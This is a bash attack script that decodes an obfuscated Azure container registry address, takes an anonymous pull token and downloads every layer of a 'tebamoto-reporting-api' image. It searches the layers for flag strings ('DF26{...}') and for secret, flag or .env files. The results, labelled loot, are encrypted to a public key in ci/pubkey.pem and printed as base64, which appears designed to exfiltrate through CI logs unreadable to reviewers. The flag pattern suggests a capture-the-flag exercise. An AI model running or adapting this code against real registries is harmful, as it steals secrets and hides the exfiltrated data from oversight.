#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"
REG=$(printf '%s' 'Y3J0YmxwbGF0cHJvZHgzeWV1b3ouYXp1cmVjci5pbw==' | base64 -d)
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
echo "=== ACR LAYERS ==="
TK=$(curl -sS "${SC}${REG}/oauth2/token?service=${REG}&scope=repository:tebamoto-reporting-api:pull" | jq -r '.access_token // empty'); say "TK=${#TK}"
[ -z "$TK" ] && { echo notok; exit 0; }
say "TAGS: $(curl -sS -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/tags/list")"
for TAG in $(curl -sS -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/tags/list" | grep -aoE '"[^"]+"' | tr -d '"' | grep -v '^name$\|^tags$' | head -20); do
  say "########## TAG $TAG ##########"
  IDX=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "${SC}${REG}/v2/tebamoto-reporting-api/manifests/$TAG")
  say "MANIFEST($TAG): $(printf '%s' "$IDX" | head -c 2500)"
  for D in $(printf '%s' "$IDX" | grep -aoE '"digest"[[:space:]]*:[[:space:]]*"sha256:[a-f0-9]+"' | grep -oE 'sha256:[a-f0-9]+' | sort -u); do
    M=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "${SC}${REG}/v2/tebamoto-reporting-api/manifests/$D")
    LG=$(printf '%s' "$M" | grep -aoE '"digest"[[:space:]]*:[[:space:]]*"sha256:[a-f0-9]+"' | grep -oE 'sha256:[a-f0-9]+' | sort -u)
    for L in $LG; do
      curl -sL -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/blobs/$L" -o /tmp/lay.tgz 2>/dev/null
      sz=$(wc -c </tmp/lay.tgz 2>/dev/null||echo 0)
      hits=$(grep -aoiE 'DF26\{[^}]{1,200}\}' /tmp/lay.tgz 2>/dev/null | sort -u | head -3)
      fnames=$(tar -tzf /tmp/lay.tgz 2>/dev/null | grep -iE 'flag|secret|\.env' | head -20)
      say "LAYER $L size=$sz hits=[$(printf '%s' "$hits" | head -c 600)] files=[$(printf '%s' "$fnames" | head -c 600)]"
      if [ -n "$hits" ]; then say "PLAINHIT: $hits"; fi
    done
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
